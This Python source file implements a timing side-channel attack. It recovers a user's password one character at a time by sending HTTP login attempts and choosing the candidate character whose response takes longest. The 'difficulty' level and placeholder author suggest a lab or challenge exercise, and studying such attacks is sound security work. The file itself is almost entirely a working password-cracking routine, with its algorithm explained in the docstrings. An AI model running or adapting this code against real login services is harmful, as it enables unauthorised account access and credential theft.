"""
Main timing attack orchestrator.

Implements IAttackStrategy interface using timing side-channel technique.

Author: Your Name
Date: 2025
"""

from typing import Dict, List
from dataclasses import dataclass

from src.core.interfaces import (
    IAttackStrategy, IHttpClient, ITimingAnalyzer,
    TimingMeasurement, CharacterAnalysis
)
from src.core.exceptions import AttackFailedException
from src.services.timing_service import TimingService, SamplingStrategy
from src.utils.logger import Logger


@dataclass
class AttackConfig:
    """Configuration for the timing attack."""
    charset: str = "abcdefghijklmnopqrstuvwxyz"
    max_length: int = 32
    verify_each_char: bool = True  # Verify after each character


class TimingAttacker(IAttackStrategy):
    """
    Character-by-character timing attack implementation.

    Algorithm:
    1. Start with empty password
    2. For each position:
        a. Try all possible characters
        b. Measure timing for each
        c. Select character with longest time
        d. Verify selection (optional)
    3. Repeat until complete password found

    Why this works:
    - Naive comparison stops at first mismatch
    - Correct characters proceed to next position
    - Extra comparison = measurable time difference

    Example:
        >>> config = AttackConfig(charset="abc", max_length=3)
        >>> attacker = TimingAttacker(http_client, analyzer, timing_service, config)
        >>> password = attacker.crack_password("user123", difficulty=1, max_length=32)
        >>> print(f"Recovered: {password}")
    """

    def __init__(
        self,
        http_client: IHttpClient,
        timing_analyzer: ITimingAnalyzer,
        timing_service: TimingService,
        config: AttackConfig,
        logger: Logger
    ):
        """
        Initialize timing attacker.

        Args:
            http_client: HTTP client for server communication
            timing_analyzer: Statistical analyzer for timing data
            timing_service: Service for collecting timing measurements
            config: Attack configuration
            logger: Logger instance
        """
        self.http_client = http_client
        self.timing_analyzer = timing_analyzer
        self.timing_service = timing_service
        self.config = config
        self.logger = logger

    def crack_password(
        self,
        username: str,
        difficulty: int,
        max_length: int
    ) -> str:
        """
        Execute the timing attack to recover the password.

        Process:
        1. Measure timing for all candidate characters
        2. Analyze measurements statistically
        3. Select best candidate
        4. Verify and continue

        Args:
            username: Target username
            difficulty: Attack difficulty level
            max_length: Maximum password length to try

        Returns:
            The recovered password

        Raises:
            AttackFailedException: If unable to recover password
        """
        password = ""
        self.logger.info(f"Starting attack on user '{username}' (difficulty {difficulty})")
        self.logger.info(f"Charset: {self.config.charset} ({len(self.config.charset)} chars)")

        for position in range(max_length):
            self.logger.info(f"\n{'='*60}")
            self.logger.info(f"Position {position}: '{password}'")
            self.logger.info(f"{'='*60}")

            # Try to find next character
            try:
                next_char = self._crack_next_character(
                    password, username, difficulty, position
                )

                if next_char is None:
                    # No character found - assume password complete
                    self.logger.info(f"✓ Password complete: {password}")
                    return password

                password += next_char
                self.logger.info(f"✓ Found character: '{next_char}' → '{password}'")

                # Verify the password so far
                if self.config.verify_each_char:
                    is_complete = self._verify_password(password, username, difficulty)
                    if is_complete:
                        self.logger.info(f"✓ Password verified: {password}")
                        return password

            except Exception as e:
                self.logger.error(f"Attack failed at position {position}: {str(e)}")
                raise AttackFailedException(position, str(e))

        self.logger.warning(f"Reached max length ({max_length}), returning: {password}")
        return password

    def _crack_next_character(
        self,
        current_password: str,
        username: str,
        difficulty: int,
        position: int
    ) -> str:
        """
        Discover the next character of the password.

        Args:
            current_password: Password prefix discovered so far
            username: Target username
            difficulty: Difficulty level
            position: Current position being tested

        Returns:
            The discovered character, or None if password is complete
        """
        # Measure all candidate characters
        measurements_dict = self.timing_service.measure_all_candidates(
            current_password=current_password,
            charset=self.config.charset,
            username=username,
            difficulty=difficulty,
            position=position
        )

        # Check if we found complete password during measurement
        for char, measurements in measurements_dict.items():
            if measurements and measurements[0].is_correct:
                return char

        # Analyze timing data for each character
        analyses: List[CharacterAnalysis] = []

        for char, measurements in measurements_dict.items():
            if not measurements:
                self.logger.warning(f"No valid measurements for '{char}'")
                continue

            analysis = self.timing_analyzer.analyze_measurements(measurements)
            analyses.append(analysis)

        if not analyses:
            self.logger.error("No valid character analyses")
            return None

        # Select best candidate
        best_char, confidence = self.timing_analyzer.compare_candidates(analyses)

        self.logger.info(
            f"Selected: '{best_char}' (confidence: {confidence:.3f})"
        )

        # Warn if low confidence
        if confidence < 0.5:
            self.logger.warning(
                f"Low confidence ({confidence:.3f}) - result may be unreliable"
            )

        return best_char

    def _verify_password(
        self,
        password: str,
        username: str,
        difficulty: int
    ) -> bool:
        """
        Verify if the current password is complete and correct.

        Args:
            password: Password to verify
            username: Target username
            difficulty: Difficulty level

        Returns:
            True if password is complete and correct
        """
        measurement = self.http_client.send_request(password, username, difficulty)
        return measurement.is_correct